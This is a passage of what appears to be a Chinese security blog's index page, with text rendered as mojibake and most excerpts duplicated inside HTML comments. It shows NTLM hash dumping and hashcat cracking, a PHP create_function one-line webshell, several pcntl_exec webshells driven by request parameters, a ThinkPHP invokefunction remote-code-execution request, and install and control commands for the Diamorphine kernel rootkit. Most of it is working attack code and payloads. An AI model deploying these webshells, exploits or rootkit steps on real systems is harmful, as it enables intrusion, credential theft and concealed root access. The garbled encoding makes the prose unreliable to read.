<p>æå–çš„æ ¼å¼å¤§æ¦‚æ˜¯è¿™æ ·:</p>
<pre class="line-numbers language-none"><code class="language-none">root@kali:~# pwdump system sam
Administrator:500:41aa818b512a8c0e72381e4c174e281b:1896d0a309184775f67c14d14b5c365a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:667d6c58d451dbf236ae37ab1de3b9f7:af733642ab69e156ba0c219d3bbc3c83:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:8dffa305e2bee837f279c2c0b082affb:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>ç”¨æˆ·åç§°æ˜¯:Administrator<br>RIDæ˜¯: 500<br>LM-HASHå€¼: 41aa818b512a8c0e72381e4c174e281b<br>NT-HASH(NTLM)å€¼: 1896d0a309184775f67c14d14b5c365a</p>
<p>å¯ä»¥ä½¿ç”¨hashcatæ¥è·‘å¯†ç :</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -m 1000 -a 0 --force hash.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>å…¶ä¸­çš„hash.txt å¯ä»¥æŒ‡çš„æ˜¯ä¸Šé¢çš„NT-HASHã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">-m 1000 hashçš„ç±»å‹ï¼Œè¿™é‡Œæ˜¯NTLM
-a 0  0è¡¨ç¤ºè¯å…¸ç¢°æ’ï¼Œè¿™é‡Œæ˜¯kaliè‡ªå¸¦çš„è¾å…¸ï¼Œè¿˜æœ‰3è¡¨ç¤ºä½¿ç”¨GPUæ¥çˆ†ç ´ï¼Œä¸ç”¨æŒ‡å®šè¯å…¸ã€‚
--force å¿½ç•¥æ— æ˜¾å¡ï¼Œç›´æ¥è·‘
hash.txt å°±æ˜¯ä¸Šé¢çš„NT-HASH
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><p><a target="_blank" rel="noopener" href="https://www.objectif-securite.ch/en/ophcrack.php">https://www.objectif-securite.ch/en/ophcrack.php</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://cyberloginit.com/2017/12/26/hashcat-ntlm-brute-force.html">https://cyberloginit.com/2017/12/26/hashcat-ntlm-brute-force.html</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4">https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4</a></p>
</li>
</ul>
	
	</div>
  <a type="button" href="/2019/03/01/hashcat.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/01/10/create_function.html" >create_function</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-01-10  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>pç¥åœ¨å°å¯†åœˆæäº†ä¸€ä¸ªcreate_functionçš„tips,å°±ç…§ä¹‹å‰çš„æ¥è¯´ä¸€å¥è¯:</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php $sl &#x3D; create_function(&#39;&#39;, @$_REQUEST[&#39;pass&#39;]);$sl();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>åªéœ€è¦å•ç‹¬ä¸€ä¸ªcreate_functionå°±å¯ä»¥æ‰§è¡Œå‡½æ•°,æœäº†ä¸‹å‘ç°åœ¨å¾ˆæ—©çš„æ—¶å€™80secæè¿‡è¿™ä¸ªé—®é¢˜:<a target="_blank" rel="noopener" href="https://www.securityfocus.com/archive/1/496728">https://www.securityfocus.com/archive/1/496728</a></p>
<p>ä¸è¿‡è¯´çš„ä¸»è¦æ˜¯ç¬¬äºŒä¸ªå‚æ•°å¯æ§çš„æƒ…å†µä¸‹ã€‚åŸç†æ¥è¯´å¾ˆç®€å•,create_functionæ˜¯ç±»ä¼¼è¿™æ ·çš„ä¸€ä¸ªå‡½æ•°:</p>
<pre class="line-numbers language-none"><code class="language-none">function create_function($args, $code) &#123;
  eval(&quot;
    function lambda_1 ($args) &#123; $code &#125;
  &quot;);
  return &#39;lambda_1&#39;;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ‰€ä»¥åœ¨ç¬¬äºŒä¸ªå‚æ•°å¯æ§çš„æƒ…å†µä¸‹é—­åˆå¤§æ‹¬å·<code>return 0; &#125; echo &#39;outside&#39;; //</code>ï¼Œå°±å¯ä»¥æ‰§è¡Œ:</p>
<pre class="line-numbers language-none"><code class="language-none">eval(&quot;
  function lambda_1 () &#123; return 0; &#125; echo &#39;outside&#39;; &#x2F;&#x2F; &#125;
&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>ç¬¬ä¸€ä¸ªå¯æ§çš„æƒ…å†µä¸‹,è¿™æ ·å°±å¯ä»¥æ‰§è¡Œphpinfo:</p>
<pre class="line-numbers language-none"><code class="language-none">create_function(&#39;)&#123;&#125;phpinfo();&#x2F;&#x2F;&#39;, &#39;&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å¯ä»¥æ”¾gdbé‡Œé¢ç›´æ¥è°ƒè¯•ä¸‹,åœ¨phpæºä»£ç é‡Œé¢æœç´¢create_functionçš„å®ç°ï¼Œç„¶åæ‰“æ–­ç‚¹å°±å¯ä»¥è°ƒè¯•å‡ºæ¥:</p>
	

	</div>
  <a type="button" href="/2019/01/10/create_function.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>pç¥åœ¨å°å¯†åœˆæäº†ä¸€ä¸ªcreate_functionçš„tips,å°±ç…§ä¹‹å‰çš„æ¥è¯´ä¸€å¥è¯:</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php $sl &#x3D; create_function(&#39;&#39;, @$_REQUEST[&#39;pass&#39;]);$sl();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>åªéœ€è¦å•ç‹¬ä¸€ä¸ªcreate_functionå°±å¯ä»¥æ‰§è¡Œå‡½æ•°,æœäº†ä¸‹å‘ç°åœ¨å¾ˆæ—©çš„æ—¶å€™80secæè¿‡è¿™ä¸ªé—®é¢˜:<a target="_blank" rel="noopener" href="https://www.securityfocus.com/archive/1/496728">https://www.securityfocus.com/archive/1/496728</a></p>
<p>ä¸è¿‡è¯´çš„ä¸»è¦æ˜¯ç¬¬äºŒä¸ªå‚æ•°å¯æ§çš„æƒ…å†µä¸‹ã€‚åŸç†æ¥è¯´å¾ˆç®€å•,create_functionæ˜¯ç±»ä¼¼è¿™æ ·çš„ä¸€ä¸ªå‡½æ•°:</p>
<pre class="line-numbers language-none"><code class="language-none">function create_function($args, $code) &#123;
  eval(&quot;
    function lambda_1 ($args) &#123; $code &#125;
  &quot;);
  return &#39;lambda_1&#39;;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ‰€ä»¥åœ¨ç¬¬äºŒä¸ªå‚æ•°å¯æ§çš„æƒ…å†µä¸‹é—­åˆå¤§æ‹¬å·<code>return 0; &#125; echo &#39;outside&#39;; //</code>ï¼Œå°±å¯ä»¥æ‰§è¡Œ:</p>
<pre class="line-numbers language-none"><code class="language-none">eval(&quot;
  function lambda_1 () &#123; return 0; &#125; echo &#39;outside&#39;; &#x2F;&#x2F; &#125;
&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>ç¬¬ä¸€ä¸ªå¯æ§çš„æƒ…å†µä¸‹,è¿™æ ·å°±å¯ä»¥æ‰§è¡Œphpinfo:</p>
<pre class="line-numbers language-none"><code class="language-none">create_function(&#39;)&#123;&#125;phpinfo();&#x2F;&#x2F;&#39;, &#39;&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å¯ä»¥æ”¾gdbé‡Œé¢ç›´æ¥è°ƒè¯•ä¸‹,åœ¨phpæºä»£ç é‡Œé¢æœç´¢create_functionçš„å®ç°ï¼Œç„¶åæ‰“æ–­ç‚¹å°±å¯ä»¥è°ƒè¯•å‡ºæ¥:</p>
	
	</div>
  <a type="button" href="/2019/01/10/create_function.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2018/12/18/pcntl_exec.html" >pcntl_exec</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2018-12-18  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>2019.8.1æ›´æ–°</p>
<p>è¿™æ ·å­æ‰§è¡Œå®Œå°±ä¸ä¼šå¤šå‡ºæ¥<defunc>çš„è¿›ç¨‹ï¼Œä¹Ÿä¸ä¼šå¤šå‡ºæ¥<code>php-fpm</code>è¿›ç¨‹:</defunc></p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php

&#x2F;**
 * å­è¿›ç¨‹é€šè¿‡ä¿¡å·killè‡ªå·±,ä¹Ÿå¯ä»¥åœ¨çˆ¶è¿›ç¨‹ä¸­å‘é€kilä¿¡å·ç»“æŸå­è¿›ç¨‹
 *&#x2F;

&#x2F;&#x2F;ç”Ÿæˆå­è¿›ç¨‹
$cmd &#x3D; $_REQUEST[&#39;cmd&#39;];
$pid &#x3D; pcntl_fork();
if($pid &#x3D;&#x3D; -1)&#123;
    die(&#39;could not fork&#39;);
&#125;else&#123;
    if($pid)&#123;
        $status &#x3D; 0;
        pcntl_exec($cmd[0], $cmd[1]);
        posix_kill(getmypid(),9);
&#x2F;&#x2F;é˜»å¡çˆ¶è¿›ç¨‹ï¼Œç›´åˆ°å­è¿›ç¨‹ç»“æŸï¼Œä¸é€‚åˆéœ€è¦é•¿æ—¶é—´è¿è¡Œçš„è„šæœ¬.
        &#x2F;&#x2F;å¯ä½¿ç”¨pcntl_wait($status, WNOHANG)å®ç°éé˜»å¡å¼

        pcntl_wait($status);
        exit;
    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>cmd[0]=/bin/bash&amp;cmd[1][0]=-c&amp;cmd[1][1]=ping%20baidu.com%20%26%26%20pkill%20php-fpm</code></p>
<p><strong>æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ä¸è¦é˜»å¡ï¼Œä¸è¦é˜»å¡,ä¸è¦é˜»å¡(ä¸¾ä¸ªä¾‹å­ï¼Œping baidu.comå°±å¾ˆè ¢äº†)</strong></p>
<hr>
<pre class="line-numbers language-none"><code class="language-none">å‚æ•°æ‰§è¡Œ:
pcntl_exec(&quot;&#x2F;bin&#x2F;bash&quot;,array(&quot;-c&quot;,&quot;id &gt; 1.txt&quot;)) &#x2F;&#x2F;è¿”å›å€¼å¯èƒ½æ˜¯502

æ‰§è¡Œè„šæœ¬:
pcntl_exec(&quot;&#x2F;tmp&#x2F;script&quot;)   &#x2F;&#x2F;è¿”å›å€¼502<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">è¿”å›å€¼200
&lt;?php
$cmd &#x3D; $_REQUEST[&#39;cmd&#39;];
if(function_exists(&#39;pcntl_exec&#39;)) &#123;
    switch(pcntl_fork())&#123;
     case 0:
        pcntl_exec($cmd[0], $cmd[1]);
    default:
          echo &quot;case 111&quot;;
    &#125;
&#125; else &#123;
        echo &#39;ä¸æ”¯æŒpcntlæ‰©å±•&#39;;
&#125;
?&gt;


cmd[0]&#x3D;&#x2F;bin&#x2F;bash&amp;cmd[1][0]&#x3D;-c&amp;cmd[1][1]&#x3D;id &gt; &#x2F;tmp&#x2F;xxx.txt

&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;pcntl_exec&amp;vars[1][0]&#x3D;&#x2F;bin&#x2F;bash&amp;vars[1][1][0]&#x3D;&#x2F;tmp&#x2F;1.sh
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<pre class="line-numbers language-none"><code class="language-none">
&lt;?php
header(&quot;Content-Type: text&#x2F;plain&quot;);
$cmd&#x3D;&quot;&#x2F;tmp&#x2F;exec&quot;;
@unlink($cmd);
@unlink(&quot;&#x2F;tmp&#x2F;output&quot;);
$c &#x3D; &quot;#!&#x2F;usr&#x2F;bin&#x2F;env bash\nuname -a &gt; &#x2F;tmp&#x2F;output\n&quot;;
file_put_contents($cmd, $c);
chmod($cmd, 0777);

switch (pcntl_fork()) &#123;
  case 0:
    $ret &#x3D; pcntl_exec($cmd);
    exit(&quot;case 0&quot;);
  default:
    echo &quot;case 1&quot;;
    break;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ä¸Šé¢æ‰§è¡Œçš„è„šæœ¬é‚£è¡Œchmodä¸å¯ä»¥å°‘</p>
	

	</div>
  <a type="button" href="/2018/12/18/pcntl_exec.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>2019.8.1æ›´æ–°</p>
<p>è¿™æ ·å­æ‰§è¡Œå®Œå°±ä¸ä¼šå¤šå‡ºæ¥<defunc>çš„è¿›ç¨‹ï¼Œä¹Ÿä¸ä¼šå¤šå‡ºæ¥<code>php-fpm</code>è¿›ç¨‹:</defunc></p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php

&#x2F;**
 * å­è¿›ç¨‹é€šè¿‡ä¿¡å·killè‡ªå·±,ä¹Ÿå¯ä»¥åœ¨çˆ¶è¿›ç¨‹ä¸­å‘é€kilä¿¡å·ç»“æŸå­è¿›ç¨‹
 *&#x2F;

&#x2F;&#x2F;ç”Ÿæˆå­è¿›ç¨‹
$cmd &#x3D; $_REQUEST[&#39;cmd&#39;];
$pid &#x3D; pcntl_fork();
if($pid &#x3D;&#x3D; -1)&#123;
    die(&#39;could not fork&#39;);
&#125;else&#123;
    if($pid)&#123;
        $status &#x3D; 0;
        pcntl_exec($cmd[0], $cmd[1]);
        posix_kill(getmypid(),9);
&#x2F;&#x2F;é˜»å¡çˆ¶è¿›ç¨‹ï¼Œç›´åˆ°å­è¿›ç¨‹ç»“æŸï¼Œä¸é€‚åˆéœ€è¦é•¿æ—¶é—´è¿è¡Œçš„è„šæœ¬.
        &#x2F;&#x2F;å¯ä½¿ç”¨pcntl_wait($status, WNOHANG)å®ç°éé˜»å¡å¼

        pcntl_wait($status);
        exit;
    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>cmd[0]=/bin/bash&amp;cmd[1][0]=-c&amp;cmd[1][1]=ping%20baidu.com%20%26%26%20pkill%20php-fpm</code></p>
<p><strong>æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ä¸è¦é˜»å¡ï¼Œä¸è¦é˜»å¡,ä¸è¦é˜»å¡(ä¸¾ä¸ªä¾‹å­ï¼Œping baidu.comå°±å¾ˆè ¢äº†)</strong></p>
<hr>
<pre class="line-numbers language-none"><code class="language-none">å‚æ•°æ‰§è¡Œ:
pcntl_exec(&quot;&#x2F;bin&#x2F;bash&quot;,array(&quot;-c&quot;,&quot;id &gt; 1.txt&quot;)) &#x2F;&#x2F;è¿”å›å€¼å¯èƒ½æ˜¯502

æ‰§è¡Œè„šæœ¬:
pcntl_exec(&quot;&#x2F;tmp&#x2F;script&quot;)   &#x2F;&#x2F;è¿”å›å€¼502<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">è¿”å›å€¼200
&lt;?php
$cmd &#x3D; $_REQUEST[&#39;cmd&#39;];
if(function_exists(&#39;pcntl_exec&#39;)) &#123;
    switch(pcntl_fork())&#123;
     case 0:
        pcntl_exec($cmd[0], $cmd[1]);
    default:
          echo &quot;case 111&quot;;
    &#125;
&#125; else &#123;
        echo &#39;ä¸æ”¯æŒpcntlæ‰©å±•&#39;;
&#125;
?&gt;


cmd[0]&#x3D;&#x2F;bin&#x2F;bash&amp;cmd[1][0]&#x3D;-c&amp;cmd[1][1]&#x3D;id &gt; &#x2F;tmp&#x2F;xxx.txt

&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;pcntl_exec&amp;vars[1][0]&#x3D;&#x2F;bin&#x2F;bash&amp;vars[1][1][0]&#x3D;&#x2F;tmp&#x2F;1.sh
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<pre class="line-numbers language-none"><code class="language-none">
&lt;?php
header(&quot;Content-Type: text&#x2F;plain&quot;);
$cmd&#x3D;&quot;&#x2F;tmp&#x2F;exec&quot;;
@unlink($cmd);
@unlink(&quot;&#x2F;tmp&#x2F;output&quot;);
$c &#x3D; &quot;#!&#x2F;usr&#x2F;bin&#x2F;env bash\nuname -a &gt; &#x2F;tmp&#x2F;output\n&quot;;
file_put_contents($cmd, $c);
chmod($cmd, 0777);

switch (pcntl_fork()) &#123;
  case 0:
    $ret &#x3D; pcntl_exec($cmd);
    exit(&quot;case 0&quot;);
  default:
    echo &quot;case 1&quot;;
    break;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ä¸Šé¢æ‰§è¡Œçš„è„šæœ¬é‚£è¡Œchmodä¸å¯ä»¥å°‘</p>
	
	</div>
  <a type="button" href="/2018/12/18/pcntl_exec.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2018/07/18/lkm-rootkit.html" >LKM Rootkit</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2018-07-18  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://github.com/m0nad/Diamorphine">https://github.com/m0nad/Diamorphine</a>,æ”¯æŒå†…æ ¸2.6.x/3.x/4.x</p>
<p>ç¼–è¯‘å®‰è£…:</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;m0nad&#x2F;Diamorphine
cd Diamorphine
make
insmod diamorphine.ko<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨<code>diamorphine.h</code>é‡Œé¢å®šä¹‰äº†<code>MAGIC_PREFIX</code>, å¯ä»¥è‡ªå·±ä¿®æ”¹ä¸ºä»»æ„å…¶ä»–ä¸œè¥¿ï¼Œæ¯”å¦‚<code>xx</code>ï¼Œç„¶åä»¥xxä¸ºå¼€å¤´çš„æ–‡ä»¶å°±å›å…¨éƒ¨éšèº«å•¦</p>
<pre class="line-numbers language-none"><code class="language-none">kill -63 0  éšè—(æ˜¾ç¤º) rootkitæ¨¡å—
rmmod diamorphine   åˆ é™¤rootkit
kill -64 0  ä»ä»»æ„ç”¨æˆ·åˆ‡æ¢åˆ°rootç”¨æˆ·
kill -31 &lt;pid&gt; éšè—&lt;pid&gt;çš„è¿›ç¨‹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2018/07/18/lkm-rootkit.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://github.com/m0nad/Diamorphine">https://github.com/m0nad/Diamorphine</a>,æ”¯æŒå†…æ ¸2.6.x/3.x/4.x</p>
<p>ç¼–è¯‘å®‰è£…:</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;m0nad&#x2F;Diamorphine
cd Diamorphine
make
insmod diamorphine.ko<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨<code>diamorphine.h</code>é‡Œé¢å®šä¹‰äº†<code>MAGIC_PREFIX</code>, å¯ä»¥è‡ªå·±ä¿®æ”¹ä¸ºä»»æ„å…¶ä»–ä¸œè¥¿ï¼Œæ¯”å¦‚<code>xx</code>ï¼Œç„¶åä»¥xxä¸ºå¼€å¤´çš„æ–‡ä»¶å°±å›å…¨éƒ¨éšèº«å•¦</p>
<pre class="line-numbers language-none"><code class="language-none">kill -63 0  éšè—(æ˜¾ç¤º) rootkitæ¨¡å—
rmmod diamorphine   åˆ é™¤rootkit
kill -64 0  ä»ä»»æ„ç”¨æˆ·åˆ‡æ¢åˆ°rootç”¨æˆ·
kill -31 &lt;pid&gt; éšè—&lt;pid&gt;çš„è¿›ç¨‹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2018/07/18/lkm-rootkit.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2018/07/05/stack.html" >æ ˆæº¢å‡ºå­¦ä¹ ç¬”è®°</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2018-07-05  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>æ ¹æ®ä¸åŒçš„æ“ä½œç³»ç»Ÿï¼Œä¸€ä¸ªè¿›ç¨‹å¯èƒ½è¢«åˆ†é…åˆ°ä¸åŒå†…å­˜åŒºåŸŸä¸­æ‰§è¡Œï¼Œä½†æ˜¯ä¸ç®¡ä»€ä¹ˆæ ·çš„ç³»ç»Ÿï¼Œä»€ä¹ˆæ ·çš„è®¡ç®—æœºç»“æ„ï¼Œè¿›ç¨‹ä½¿ç”¨çš„å†…å­˜å¯ä»¥æŒ‰ç…§åŠŸèƒ½åˆ†ä¸º4ä¸ªéƒ¨åˆ†ï¼š</p>
<ol>
<li>ä»£ç åŒºï¼šå¯æ‰§è¡ŒæŒ‡ä»¤</li>
<li>æ•°æ®åŒºï¼šç”¨äºå­˜å‚¨å…¨å±€å˜é‡</li>
<li>å †åŒºï¼šè¿›ç¨‹å¯ä»¥åœ¨å †åŒºåŠ¨æ€çš„è¯·æ±‚ä¸€å®šå¤§å°å†…å­˜ï¼Œå¹¶åœ¨ç”¨å®Œä¹‹åå½’è¿˜ç»™å †åŒºã€‚åŠ¨æ€åˆ†å¸ƒå’Œå›æ”¶æ˜¯å †åŒºçš„ç‰¹ç‚¹</li>
<li>æ ˆåŒºï¼šç”¨äºåŠ¨æ€çš„å­˜å‚¨å‡½æ•°ä¹‹é—´çš„è°ƒç”¨å…³ç³»ï¼Œä»¥ä¿è¯è¢«è°ƒç”¨å‡½æ•°è¿”å›æ—¶æ¢å¤åˆ°æ¯å‡½æ•°ä¸­ç»§ç»­æ‰§è¡Œ</li>
</ol>
<p>ç¨‹åºä¸­ä½¿ç”¨çš„ç¼“å†²åŒºå¯ä»¥åœ¨å †åŒºã€æ ˆåŒºã€æ•°æ®åŒºï¼Œä¸åŒåœ°æ–¹çš„ç¼“å†²åŒºåˆ©ç”¨æ–¹å¼ä¸åŒã€‚</p>
<p>å†…å­˜ä¸­çš„æ ˆåŒºæŒ‡çš„å°±æ˜¯ç³»ç»Ÿæ ˆï¼Œç”±ç³»ç»Ÿè‡ªåŠ¨ç»´æŠ¤ã€‚</p>
<p>æ ˆæ—¶FILOç»“æ„ï¼Œæ‰€ä»¥æ ˆé¡¶æŒ‡çš„æ˜¯æœ€ä¸‹æ–¹ï¼Œåº•éƒ¨æ˜¯æœ€ä¸Šæ–¹ã€‚</p>
<ul>
<li>%esp æŒ‡å‘æ ˆçš„é¡¶éƒ¨ï¼ˆæ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼Œå­˜æ”¾ä¸€ä¸ªæŒ‡é’ˆï¼Œæ°¸è¿œæŒ‡å‘ç³»ç»Ÿæ ˆæœ€ä¸Šé¢æ ˆå¸§çš„æ ˆé¡¶)</li>
<li>%ebp æŒ‡å‘æ ˆçš„åº•éƒ¨</li>
<li>%eip ç”¨æ¥å­˜å‚¨å³å°†æ‰§è¡Œçš„ç¨‹åºæŒ‡ä»¤çš„åœ°å€</li>
<li>Frame Pointer(FP) Or Base Pointer(BP), Stack Pointer(SP)</li>
<li>å‡½æ•°æ ˆå¸§ï¼šESPå’ŒEBPä¹‹é—´å†…å­˜ç©ºé—´ä¸ºå½“å‰æ ˆå¸§</li>
</ul>
<p>32ä½x86æ¶æ„ä¸‹çš„é€šç”¨å¯„å­˜å™¨åŒ…æ‹¬ä¸€èˆ¬å¯„å­˜å™¨ï¼ˆeaxã€ebxã€ecxã€edxï¼‰ï¼Œç´¢å¼•å¯„å­˜å™¨ï¼ˆesiã€edi)ï¼Œä»¥åŠå †æ ˆæŒ‡é’ˆå¯„å­˜å™¨(esp,ebp)</p>
<ul>
<li>eax: ç´¯åŠ å¯„å­˜å™¨(Accumulator),ç”¨ä»¥è¿›è¡Œç®—æ•°è¿ç®—å’Œè¿”å›å‡½æ•°ç»“æœç­‰ã€‚</li>
<li>ebx: è¢«ç§°ä¸ºåŸºå€å¯„å­˜å™¨ï¼ˆBaseï¼‰ï¼Œåœ¨å†…å­˜å¯»å€çš„æ—¶å€™ç”¨æ¥å­˜æ”¾åŸºåœ°å€ã€‚</li>
<li>exc: è¢«ç§°ä¸ºè®¡æ•°å¯„å­˜å™¨(Counter)ï¼Œç”¨ä»¥åœ¨å¾ªç¯ä¸­è®¡æ•°ã€‚</li>
<li>edx: è¢«ç§°ä¸ºæ•°æ®å¯„å­˜å™¨(Data)ï¼Œå¸¸é…åˆeaxä¸€èµ·å­˜æ”¾è¿ç®—ç»“æœç­‰æ•°æ®ã€‚</li>
</ul>
<p>æ ˆæ“ä½œï¼ˆåœ¨32ä½ä¸‹)ï¼š</p>
<ul>
<li>pushï¼ˆå‹æ ˆï¼‰ push sth -&gt; [esp]=sth, esp=esp-4</li>
<li>pop ï¼ˆå‡ºæ ˆï¼‰ pop sth -&gt; sth=[esp], esp=esp+4</li>
</ul>
	

	</div>
  <a type="button" href="/2018/07/05/stack.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>æ ¹æ®ä¸åŒçš„æ“ä½œç³»ç»Ÿï¼Œä¸€ä¸ªè¿›ç¨‹å¯èƒ½è¢«åˆ†é…åˆ°ä¸åŒå†…å­˜åŒºåŸŸä¸­æ‰§è¡Œï¼Œä½†æ˜¯ä¸ç®¡ä»€ä¹ˆæ ·çš„ç³»ç»Ÿï¼Œä»€ä¹ˆæ ·çš„è®¡ç®—æœºç»“æ„ï¼Œè¿›ç¨‹ä½¿ç”¨çš„å†…å­˜å¯ä»¥æŒ‰ç…§åŠŸèƒ½åˆ†ä¸º4ä¸ªéƒ¨åˆ†ï¼š</p>
<ol>
<li>ä»£ç åŒºï¼šå¯æ‰§è¡ŒæŒ‡ä»¤</li>
<li>æ•°æ®åŒºï¼šç”¨äºå­˜å‚¨å…¨å±€å˜é‡</li>
<li>å †åŒºï¼šè¿›ç¨‹å¯ä»¥åœ¨å †åŒºåŠ¨æ€çš„è¯·æ±‚ä¸€å®šå¤§å°å†…å­˜ï¼Œå¹¶åœ¨ç”¨å®Œä¹‹åå½’è¿˜ç»™å †åŒºã€‚åŠ¨æ€åˆ†å¸ƒå’Œå›æ”¶æ˜¯å †åŒºçš„ç‰¹ç‚¹</li>
<li>æ ˆåŒºï¼šç”¨äºåŠ¨æ€çš„å­˜å‚¨å‡½æ•°ä¹‹é—´çš„è°ƒç”¨å…³ç³»ï¼Œä»¥ä¿è¯è¢«è°ƒç”¨å‡½æ•°è¿”å›æ—¶æ¢å¤åˆ°æ¯å‡½æ•°ä¸­ç»§ç»­æ‰§è¡Œ</li>
</ol>
<p>ç¨‹åºä¸­ä½¿ç”¨çš„ç¼“å†²åŒºå¯ä»¥åœ¨å †åŒºã€æ ˆåŒºã€æ•°æ®åŒºï¼Œä¸åŒåœ°æ–¹çš„ç¼“å†²åŒºåˆ©ç”¨æ–¹å¼ä¸åŒã€‚</p>
<p>å†…å­˜ä¸­çš„æ ˆåŒºæŒ‡çš„å°±æ˜¯ç³»ç»Ÿæ ˆï¼Œç”±ç³»ç»Ÿè‡ªåŠ¨ç»´æŠ¤ã€‚</p>
